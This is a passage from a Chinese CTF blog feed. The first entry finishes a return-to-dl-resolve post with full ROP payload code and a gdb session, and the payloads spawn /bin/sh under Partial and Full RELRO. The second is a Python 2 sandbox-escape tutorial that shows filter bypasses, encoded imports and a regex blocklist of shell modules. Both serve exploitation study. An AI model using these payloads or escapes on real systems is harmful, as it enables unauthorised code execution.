     p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    # Elf32_Rel    p32(buf) + # r_offset    p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info    p32(0) + # padding    # Elf32_Sym &lt;= buf+2048+12    p32(buf + 2048 + 28 - dynstr) + # st_name    p32(0) + # st_value    p32(0) + # st_size    p32(0x12) + # st_info    # buf+2048+28    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位有一些地方不太一样，比如说结构体的大小等，其中 <code>reloc_arg</code> 的宏定义也和 32 位不同，上文也提到了。不过 <code>Elf64_Sym</code> 结构体的大小还是跟 32 位下的 <code>Elf32_Sym</code> 一样，只是几个变量的顺序有所改变，需要修改。同时，64 位下会产生上面提到的 Segmentation Fault。由于 64 位的 Function Call 用的是 <code>__libc_csu_init</code> 中的通用 Gadget，设置第一个参数 rdi 时只能传低 32 位，所以导致不能直接 <code>memcpy</code> 到 <code>link_map</code> 上来改 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>，所以借助了 <code>read</code> 和 <code>write</code> 来实现：</p><pre><code class="python">reloc_arg = (buf + 2048 + 16 - relplt) / 24payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        write(1, 0, 0x1c8+8) + # buf+1024+240        memcpy(buf + 1024 + 400, got1, 8) + # buf+1024+360        read(0, 0, 0x1c8+8) + # buf+1024+480 ; l-&gt;l_info[VERSYMIDX (DT_VERSYM)]=NULL        p64(pop_rdi_ret) +        p64(buf + 2048 + 56) +        p64(plt0) +        p64(reloc_arg) # set reloc_arg    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    16 * &#39;\x00&#39; + # padding    # Elf64_Rela    p64(buf) + # r_offset    p64(0x7 | (((buf + 2048 + 32 - dynsym) / 24) &lt;&lt; 32)) + # r_info    # Elf64_Sym &lt;= buf+2048+32    p32(buf + 2048 + 48 - dynstr) + # st_name    p32(0x12) + # st_info    p32(0) +    p32(0) +    # buf+2048+48    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>Partial RELRO 的第二种方法是直接修改 <code>link_map</code>，将 <code>l_info[DT_STRTAB]</code> 指向构造出来的 <code>Elf32_Dyn</code>（<code>Elf64_Dyn</code>）来伪造 <code>.dynstr</code>。然后呼叫 <code>__gmon_start__</code> 并在对应 <code>st_name</code> 的地址处放上 <code>&quot;system\x00&quot;</code>。不过需要有特定的 Gadget 才有办法在不能泄漏的情况下使 <code>*(*(pointer)+offset)=value</code>。32 位下构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, got1, 4) + # buf+1024+20        memcpy(buf, 0, 56) + # buf+1024+40        memcpy(buf + 52, buf + 2048, 4) + # buf+1024+60        memcpy(buf + 1024 + 88, got1, 4) + # buf+1024+80        memcpy(0, buf, 56) + # buf+1024+100        p32(gmon_start_plt) + p32(0xdeadbeef) + p32(buf + 2048 + 20)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p32(buf + 2048 + 4) +    p32(5) +    p32(buf + 2048 + 12 - st_name) +    # buf+2048+12    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下对 <code>link_map</code> 的修改同样借助了泄漏来实现：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        memcpy(buf, 0, 112) + # buf+1024+240        memcpy(buf + 104, buf + 2048, 8) + # buf+1024+360        write(1, buf, 112) + # buf+1024+480        memcpy(buf + 1024 + 640, got1, 8) + # buf+1024+600        read(0, 0, 112) + # buf+1024+720        p64(pop_rdi_ret) +        p64(buf + 2048 + 32) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8) +    p64(5) +    p64(buf + 2048 + 24 - st_name) +    # data+24    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h2><p>GOT1 和 GOT2 在 Full RELRO 时被置为了 0，所以重点在于如何找回 <code>link_map</code> 和 Dynamic Resolver：</p><ul><li>找回 <code>link_map</code>：<code>.dynamic</code> 中 <code>DT_BUG</code> 指向 <code>r_debug</code> 结构，<code>r_debug</code> 中 <code>r_map</code> 指向 <code>link_map</code>；</li><li>找回 Dynamic Resolver：用 <code>l_next</code> 找下一个 Library，然后用 <code>l_info[DT_PLTGOT]</code> 找出 Library 的 <code>.got.plt</code> 地址（因为大部分 Library 都不是 Full RELRO，它们对应的 GOT2 就是 <code>_dl_runtime_resolve</code>）。</li></ul><p>以 32 位的程序为例，下面是 <code>link_map</code> 和 <code>_dl_runtime_resolve</code> 的查找过程：</p><pre><code class="gdb">(gdb) p/x *(Elf32_Dyn *)(0x08049ee8+12*8)$1 = {  d_tag = 0x15,  d_un = {    d_val = 0xf7ffd928,    d_ptr = 0xf7ffd928  }}(gdb) p/x *(struct r_debug *)0xf7ffd928$2 = {  r_version = 0x1,  r_map = 0xf7ffd940,  r_brk = 0xf7febae8,  r_state = 0x0,  r_ldbase = 0xf7fdd000}(gdb) p/x *(struct link_map *)0xf7ffd940$3 = {  l_addr = 0x0,  l_name = 0xf7ffdc2c,  l_ld = 0x8049ee8,  l_next = 0xf7ffdc30,  l_prev = 0x0,  l_real = 0xf7ffd940,  l_ns = 0x0,  l_libname = 0xf7ffdc20,  l_info = {0x0, 0x8049ee8, 0x8049f58, 0x8049f50, 0x0, 0x8049f28, 0x8049f30, 0x0, 0x0, 0x0, 0x8049f38, 0x8049f40, 0x8049ef0, 0x8049ef8, 0x0, 0x0, 0x0,    0x8049f70, 0x8049f78, 0x8049f80, 0x8049f60, 0x8049f48, 0x0, 0x8049f68, 0x8049f90, 0x8049f00, 0x8049f10, 0x8049f08, 0x8049f18, 0x0, 0x0, 0x0, 0x0, 0x0,    0x8049fa0, 0x8049f98, 0x0, 0x0, 0x8049f90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fa8, 0x0 &lt;repeats 25 times&gt;, 0x8049f20},  l_phdr = 0x8048034,  l_entry = 0x8048350,  l_phnum = 0x9,  l_ldnum = 0x0,  ...(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_info[3]$4 = 0x0(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_next-&gt;l_info[3]$5 = 0xf7fd2de0(gdb) p/x *(Elf32_Dyn *)0xf7fd2de0$6 = {  d_tag = 0x3,  d_un = {    d_val = 0xf7fd3000,    d_ptr = 0xf7fd3000  }}(gdb) x/3wx 0xf7fd30000xf7fd3000:    0x0019bd88    0xf7fd7770    0xf7ff04e0(gdb) x/i 0xf7ff04e0   0xf7ff04e0 &lt;_dl_runtime_resolve&gt;:    push   eax</code></pre><p>32 位下的构造如下：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, r_debug_addr, 4) + # buf+1024+20        memcpy(buf, 0, 8) + # buf+1024+40 ; link_map=buf+4        memcpy(buf + 1024 + 72, link_map_addr, 4) + # buf+1024+60        memcpy(buf + 8, 0, 16) + # buf+1024+80 ; link_map-&gt;l_next=buf+20        memcpy(buf + 1024 + 112, buf + 20, 4) + # buf+1024+100        memcpy(buf + 8, 0, 16) + # buf+1024+120 ; link_map-&gt;l_next-&gt;l_next=buf+20        memcpy(buf + 1024 + 152, buf + 20, 4) + # buf+1024+140        memcpy(buf + 8, 0, 48) + # buf+1024+160 ; link_map-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+52        memcpy(buf + 1024 + 192, buf + 52, 4) + # buf+1024+180        memcpy(buf + 8, 0, 8) + # buf+1024+200 ; .got.plt=buf+12        memcpy(buf + 1024 + 232, buf + 12, 4) + # buf+1024+220        memcpy(buf + 8, 0, 12) + # buf+1024+240 ; _dl_runtime_resolve=buf+16        memcpy(buf + 1024 + 280, dl_runtime_resolve_addr, 4) + # buf+1024+260        memcpy(buf + 1024 + 284, link_map_addr, 4) + # buf+1024+280        p32(0) + # _dl_runtime_resolve        p32(0) + # link_map        p32(reloc_arg) + # reloc_arg        p32(0xdeadbeef) +        p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048        # Elf32_Rel        p32(buf) + # r_offset        p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info        p32(0) + # padding        # Elf32_Sym &lt;= buf+2048+12        p32(buf + 2048 + 28 - dynstr) + # st_name        p32(0) + # st_value        p32(0) + # st_size        p32(0x12) + # st_info        # buf+2048+28        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下会需要更长的输入才能完成一系列的构造：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) +        memcpy(buf + 1024 + 160, r_debug_addr, 8) + # buf+1024+120        memcpy(buf, 0, 16) + # buf+1024+240 ; link_map_addr=buf+8        memcpy(buf + 1024 + 400, link_map_addr, 8) + # buf+1024+360        memcpy(buf + 16, 0, 32) + # buf+1024+480 ; l-&gt;l_next=buf+40        memcpy(buf + 1024 + 640, buf + 40, 8) + # buf+1024+600        memcpy(buf + 16, 0, 32) + # buf+1024+720 ; l-&gt;l_next-&gt;l_next=buf+40        memcpy(buf + 1024 + 880, buf + 40, 8) + # buf+1024+840        memcpy(buf + 16, 0, 96) + # buf+1024+960 ; l-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+104        memcpy(buf + 1024 + 1120, buf + 104, 8) + # buf+1024+1080        memcpy(buf + 16, 0, 16) + # buf+1024+1200 ; .got.plt=buf+24        memcpy(buf + 1024 + 1360, buf + 24, 8) + # buf+1024+1320        memcpy(buf + 16, 0, 24) + # buf+1024+1440 ; _dl_runtime+resolve=buf+32        memcpy(buf + 1024 + 1600, link_map_addr, 8) + # buf+1024+1560        write(1, 0, 0x1c8+8) + # buf+1024+1680        memcpy(buf + 1024 + 1840, link_map_addr, 8) + # buf+1024+1800        read(0, 0, 0x1c8+8) + # buf+1024+1920        memcpy(buf + 1024 + 2176, dl_runtime_resolve_addr, 8) + # buf+1024+2040        memcpy(buf + 1024 + 2184, link_map_addr, 8) + # buf+1024+2160        p64(pop_rdi_ret) +        p64(buf + 4096 + 40) +        p64(0) + # _dl_runtime_resolve        p64(0) + # link_map        p64(reloc_arg) # reloc_arg    ).ljust(4096, &#39;\x00&#39;) + # buf+4096        # Elf64_Rela        p64(buf) + # r_offset        p64(0x7 | (((buf + 4096 + 16 - dynsym) / 24) &lt;&lt; 32)) + # r_info        # Elf64_Sym &lt;= buf+4096+16        p32(buf + 4096 + 32 - dynstr) + # st_name        p32(0x12) + # st_info        p32(0) +        p32(0) +        # buf+4096+32        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=wsIvqd9YqTI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wsIvqd9YqTI</a><br><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>初探Python沙箱逃逸</title>
    <link href="blog.b3ale.cn/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>blog.b3ale.cn/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-04-02T11:03:42.000Z</published>
    <updated>2020-04-03T03:41:06.880Z</updated>
    
    <content type="html"><![CDATA[<p>接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。</p><a id="more"></a><blockquote><p>沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终拿到 shell。</p></blockquote><p>对于 Python2 的沙箱逃逸而言，实现目的的最终想法有以下几个：</p><ul><li>使用 <code>os</code> 包中的 <code>popen</code>、<code>system</code> 两个函数</li><li>使用 <code>commands</code> 模块中的方法</li><li>使用 <code>subprocess</code> 模块中的方法</li><li>使用写文件到指定位置，再使用其他辅助手段</li></ul><p>总体来说，就是使用以下几个函数来执行命令：</p><pre><code class="python">import osimport subprocessimport commandsos.system(&#39;ifconfig&#39;)os.popen(&#39;ifconfig&#39;)commands.getoutput(&#39;ifconfig&#39;)commands.getstatusoutput(&#39;ifconfig&#39;)subprocess.call([&#39;ifconfig&#39;], shell=True)</code></pre><p>下面记录针对不同情况采取的绕过方法。</p><blockquote><p>PS：获取当前的 Python 环境</p><pre><code class="python">import sysprint sys.version</code></pre></blockquote><h1 id="一些有用的模块和函数"><a href="#一些有用的模块和函数" class="headerlink" title="一些有用的模块和函数"></a>一些有用的模块和函数</h1><p>除了上面提到的几个模块，还有几种可以曲线救国。</p><h2 id="timeit-模块"><a href="#timeit-模块" class="headerlink" title="timeit 模块"></a><code>timeit</code> 模块</h2><p>用于测试小代码片段的运行时间（<code>number</code> 即表示测试的次数）：</p><pre><code class="python">import timeittimeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&quot;, number=1)</code></pre><h2 id="platform-模块"><a href="#platform-模块" class="headerlink" title="platform 模块"></a><code>platform</code> 模块</h2><p>类似 <code>os</code> 模块的 <code>popen</code>，可以执行命令：</p><pre><code class="python">import platformplatform.popen(&#39;pwd&#39;).read()</code></pre><h2 id="codecs-模块"><a href="#codecs-模块" class="headerlink" title="codecs 模块"></a><code>codecs</code> 模块</h2><p>可以用来读文件：</p><pre><code class="python">import codecscodecs.open(&#39;code.py&#39;).read()</code></pre><h2 id="exec-、eval-、execfile-、compile-函数"><a href="#exec-、eval-、execfile-、compile-函数" class="headerlink" title="exec()、eval()、execfile()、compile() 函数"></a><code>exec()</code>、<code>eval()</code>、<code>execfile()</code>、<code>compile()</code> 函数</h2><ul><li><code>exec()</code>：动态运行代码段，返回值为 <code>None</code></li><li><code>eval()</code>：计算单个表达式的值，有返回值</li><li><code>execfile()</code>：动态运行某个文件中的代码</li><li><code>compile()</code>：将一个字符串编译为字节代码</li></ul><pre><code class="python">In [1]: o = compile(&#39;a = 1 + 1&#39;, &#39;&lt;string&gt;&#39;, &#39;exec&#39;)In [2]: exec(o)In [3]: print a2</code></pre><h1 id="字符串过滤的绕过"><a href="#字符串过滤的绕过" class="headerlink" title="字符串过滤的绕过"></a>字符串过滤的绕过</h1><p>如果是某个字符串被过滤了，可以对它进行一些变换：</p><pre><code class="python">In [1]: d = {&#39;key&#39;: 1}In [2]: print d[&#39;yek&#39;[::-1]]1</code></pre><p>如果是关键字被过滤了，可以使用 <code>getattr</code>。<code>getattr</code> 接收两个参数，第一个是模块或对象，第二个是一个字符串。它会在模块或对象中搜索指定的函数或属性：</p><pre><code class="python">In [1]: import osIn [2]: getattr(os, &#39;676574637764&#39;.decode(&#39;hex&#39;))()Out[2]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="import-花式处理"><a href="#import-花式处理" class="headerlink" title="import 花式处理"></a><code>import</code> 花式处理</h1><p><code>import</code> 关键字用来导入包，沙箱中对一些包或是函数进行了屏蔽，从 <code>import</code> 的不同方法到 <code>import</code> 的本质有多种不同的绕过方法。</p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>防御最基础的思路就是正则匹配代码中的内容，检测是否调用了 <code>import</code>：</p><pre><code class="python">In [1]: import re   ...: code = &#39;import os&#39;   ...: pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)   ...: if pat.search(code) != None:   ...:     raise Exception, &#39;Detected forbidden module.&#39;   ...:---------------------------------------------------------------------------Exception                                 Traceback (most recent call last)&lt;ipython-input-1-db50a328bbb7&gt; in &lt;module&gt;()      3 pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)      4 if pat.search(code) != None:----&gt; 5     raise Exception, &#39;Detected forbidden module.&#39;Exception: Detected forbidden module.</code></pre><p>绕过的方式也很简单，使用其他的方式来导入其他包名：</p><ul><li><code>import</code> 关键字</li><li><code>__import__</code> 函数</li><li><code>importlib</code> 库</li></ul><pre><code class="python">__import__(&#39;Y29tbWFuZHM=&#39;.decode(&#39;base64&#39;)).getoutput(&#39;pwd&#39;)import importlibx = importlib.import_module(&#39;pbzznaqf&#39;.decode(&#39;rot_13&#39;))print x.getoutput(&#39;pwd&#39;)</code></pre><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>在 Python2 中不用直接使用的内置函数被称为 builtin 函数，跟随 <code>__builtin__</code> 模块自动被加载。例如 <code>open()</code>、<code>int()</code>、<code>chr()</code> 这些函数相当于如下形式：</p><pre><code class="python">__builtin__.open()__builtin__.int()__builtin__.chr()</code></pre><p>防御的一种方法就是用 <code>del</code> 把这些函数删除：</p><pre><code class="python">In [1]: del __builtin__.chrIn [2]: chr(1)---------------------------------------------------------------------------NameError                                 Traceback (most recent call last)&lt;ipython-input-2-288f58b79c7d&gt; in &lt;module&gt;()----&gt; 1 chr(1)NameError: name &#39;chr&#39; is not defined</code></pre><p>绕过的方法是使用 <code>reload</code> 来重新加载 <code>__builtin__</code> 模块：</p><pre><code class="python">In [1]: reload(__builtin__)Out[1]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [2]: chr(1)Out[2]: &#39;\x01&#39;</code></pre><p>同时 <code>reload</code> 也是 <code>__builtin__</code> 下的一个函数，如果删除了它该怎么办？答案是使用 <code>imp</code> 模块，也可以对 <code>__builtin</code> 进行重新导入：</p><pre><code class="python">In [1]: import impIn [2]: imp.reload(__builtin__)Out[2]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [3]: chr(1)Out[3]: &#39;\x01&#39;</code></pre><h2 id="Advance"><a href="#Advance" class="headerlink" title="Advance"></a>Advance</h2><p>Python 中的所有包都是以 <code>.py</code> 文件的形式存在的，说明所有 <code>import</code> 进来的包一开始都预先在某个位置了。一般和系统相关的信息都在 <code>sys</code> 下，使用 <code>sys.path</code> 查看各个包的路径：</p><pre><code class="python">In [1]: import sysIn [2]: sys.pathOut[2]:[&#39;&#39;, &#39;/usr/local/bin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python27.zip&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-darwin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac/lib-scriptpackages&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-old&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload&#39;, &#39;~/Library/Python/2.7/lib/python/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages/oletools-0.54.2-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/msoffcrypto_tool-4.10.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/colorclass-2.2.0-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/easygui-0.98.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/olefile-0.46-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/ida_netnode-1.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/wasm-1.2-py2.7.egg&#39;, &#39;~/Tools/python-uncompyle6&#39;, &#39;/usr/local/lib/python2.7/site-packages/PyMySQL-0.9.3-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/pysm4-0.7-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/IPython/extensions&#39;, &#39;~/.ipython&#39;]</code></pre><p><code>sys</code> 下还有一个 <code>modules</code>，返回一个字典，其中可以查看各个模块对应的系统路径。如果修改这个字典中的内容，前面使用的方法就都失效了：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = NoneIn [3]: import os---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-9-543d7f3a58ae&gt; in &lt;module&gt;()----&gt; 1 import osImportError: No module named osIn [4]: __import__(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-10-1b9b14481c7e&gt; in &lt;module&gt;()----&gt; 1 __import__(&#39;os&#39;)ImportError: No module named osIn [5]: import importlibIn [6]: importlib.import_module(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-12-51afbccc7d3c&gt; in &lt;module&gt;()----&gt; 1 importlib.import_module(&#39;os&#39;)/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/importlib/__init__.pyc in import_module(name, package)     35             level += 1     36         name = _resolve_name(name[level:], package, level)---&gt; 37     __import__(name)     38     return sys.modules[name]ImportError: No module named os</code></pre><p>解决这种情况，就得尝试把对应的模块路径修复回来，一般默认的 <code>os</code> 模块是在 <code>/usr/bin/python2.7/os.py</code>：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = &#39;/usr/lib/python2.7/os.py&#39;In [3]: import os</code></pre><h2 id="Hell"><a href="#Hell" class="headerlink" title="Hell"></a>Hell</h2><p>如果把 <code>sys</code>、<code>os</code>、<code>reload</code> 等一系列模块都过滤掉了，使用什么方法来绕过呢？导入模块的过程其实就是把对应模块的代码执行一遍的过程，在知道模块对应路径的情况下，就可以相应地执行它：</p><pre><code class="python">In [1]: execfile(&#39;/usr/lib/python2.7/os.py&#39;)In [2]: system(&#39;pwd&#39;)/usr/lib/python2.7Out[2]: 0In [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><p>在 <code>execfile</code> 被禁止的情况下，还可以用 <code>open</code> 读入文件，并使用 <code>exec</code> 来执行相应的代码：</p><pre><code class="python">In [1]: code = open(&#39;/usr/lib/python2.7/os.py&#39;, &#39;r&#39;).read()In [2]: exec codeIn [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="各类内联函数和属性的使用"><a href="#各类内联函数和属性的使用" class="headerlink" title="各类内联函数和属性的使用"></a>各类内联函数和属性的使用</h1><h2 id="dir-和-dict"><a href="#dir-和-dict" class="headerlink" title="dir 和 __dict__"></a><code>dir</code> 和 <code>__dict__</code></h2><p><code>dir</code> 和 <code>__dict__</code> 可以用来查看类或对象下的所有属性信息：</p><pre><code class="python">In [1]: class A():    ...:     def __init__(self):    ...:         self.a = &#39;a&#39;    ...:In [2]: dir(A)Out[2]: [&#39;__doc__&#39;, &#39;__init__&#39;, &#39;__module__&#39;]In [3]: A.__dict__Out[3]:{&#39;__doc__&#39;: None, &#39;__init__&#39;: &lt;function __main__.__init__&gt;, &#39;__module__&#39;: &#39;__main__&#39;}</code></pre><p>和 <code>sys.modules</code> 配合使用获得一个模块的引用：</p><pre><code class="python">In [1]: import sysIn [2]: dir(sys.modules[__name__])Out[2]:[&#39;In&#39;, &#39;Out&#39;, &#39;_&#39;, &#39;_11&#39;, &#39;_12&#39;, &#39;_13&#39;, &#39;_14&#39;, &#39;_15&#39;, &#39;_8&#39;, &#39;__&#39;, &#39;___&#39;, &#39;__builtin__&#39;, &#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;_dh&#39;, &#39;_i&#39;, &#39;_i1&#39;, &#39;_i10&#39;, &#39;_i11&#39;, &#39;_i12&#39;, &#39;_i13&#39;, &#39;_i14&#39;, &#39;_i15&#39;, &#39;_i16&#39;, &#39;_i17&#39;, &#39;_i2&#39;, &#39;_i3&#39;, &#39;_i4&#39;, &#39;_i5&#39;, &#39;_i6&#39;, &#39;_i7&#39;, &#39;_i8&#39;, &#39;_i9&#39;, &#39;_ih&#39;, &#39;_ii&#39;, &#39;_iii&#39;, &#39;_oh&#39;, &#39;_sh&#39;, &#39;d&#39;, &#39;exit&#39;, &#39;get_ipython&#39;, &#39;os&#39;, &#39;quit&#39;, &#39;s&#39;, &#39;sys&#39;]</code></pre><h2 id="func-code-的利用"><a href="#func-code-的利用" class="headerlink" title="func_code 的利用"></a><code>func_code</code> 的利用</h2><p>函数的 <code>func_code</code> 属性可以被用来查看函数的参数个数以及变量，还能看到函数对应的字节码：</p><pre><code class="python">In [1]: def f(x, y, z):    ...:     a = &#39;secret&#39;    ...:     b = 2333    ...:In [2]: f.func_code.co_argcountOut[2]: 3In [3]: f.func_code.co_constsOut[3]: (None, &#39;secret&#39;, 2333)In [4]: f.func_code.co_codeOut[4]: &#39;d\x01\x00}\x03\x00d\x02\x00}\x04\x00d\x00\x00S&#39;</code></pre><p>使用 <code>dis</code> 库可以获取函数对应汇编格式的字节码：</p><pre><code class="python">In [1]: import disIn [2]: dis.dis(f)  2           0 LOAD_CONST               1 (&#39;secret&#39;)              3 STORE_FAST               3 (a)  3           6 LOAD_CONST               2 (2333)              9 STORE_FAST               4 (b)             12 LOAD_CONST               0 (None)             15 RETURN_VALUE</code></pre><h2 id="mro-和-bases-属性"><a href="#mro-和-bases-属性" class="headerlink" title="__mro__ 和 __bases__ 属性"></a><code>__mro__</code> 和 <code>__bases__</code> 属性</h2><p>Python 允许多重继承，即一个子类有多个父类。<code>__mro__</code> 属性可以用来查看一个子类所有的父类；<code>__bases__</code> 可以获取上一层的继承关系：</p><pre><code class="python">In [1]: class A(object): passIn [2]: class B(object): passIn [3]: class C(A, B): passIn [4]: C.__bases__Out[4]: (__main__.A, __main__.B)In [5]: C.__mro__Out[5]: (__main__.C, __main__.A, __main__.B, object)In [6]: 1..__class__.__bases__Out[6]: (object,)In [7]: 1..__class__.__mro__Out[7]: (float, object)In [8]: &#39;&#39;.__class__.__bases__Out[8]: (basestring,)In [9]: &#39;&#39;.__class__.__mro__Out[9]: (str, basestring, object)</code></pre><p>比如在 <code>open</code> 等文件操作被限制的情况下可以用下面的方法读取文件内容（<code>__subclasses__</code> 即用来查看对象的所有子类；<code>Object</code> 的查询结果中第 40 个类为 <code>file</code>）：</p><pre><code class="python">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()1..__class__.__bases__[0].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()</code></pre><p>其他的一些执行命令的方法（通过获取其他已经载入了 os 等模块的类进行调用）：</p><pre><code class="python"># 